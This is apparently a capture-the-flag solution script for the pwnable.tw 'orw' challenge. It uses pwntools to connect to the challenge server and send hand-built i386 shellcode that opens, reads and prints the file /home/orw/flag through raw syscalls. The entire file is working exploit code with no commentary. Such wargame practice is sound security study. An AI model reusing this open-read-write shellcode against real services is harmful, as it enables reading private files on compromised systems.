#!/usr/bin/env python

from pwn import *
context.arch = 'i386'

# r = process('./orw')
r = remote('chall.pwnable.tw', 10001)

shellcode = asm('push 0x6761')
shellcode += asm('push 0x6c662f77')
shellcode += asm('push 0x726f2f65')
shellcode += asm('push 0x6d6f682f')

shellcode += asm('mov ebx, esp')
shellcode += asm('mov eax, 0x05')
shellcode += asm('mov ecx, 0x0000')
shellcode += asm('mov edx, 0')
shellcode += asm('int 0x80')

shellcode += asm('sub esp, 0x80')
shellcode += asm('mov ebx, eax')
shellcode += asm('mov eax, 0x03')
shellcode += asm('mov ecx, esp')
shellcode += asm('mov edx, 0x80')
shellcode += asm('int 0x80')

shellcode += asm('mov edx, eax')
shellcode += asm('mov eax, 0x04')
shellcode += asm('mov ebx, 0x1')
shellcode += asm('int 0x80')

# raw_input('#')
r.recvuntil(':')
r.send(shellcode)

print r.recvline()


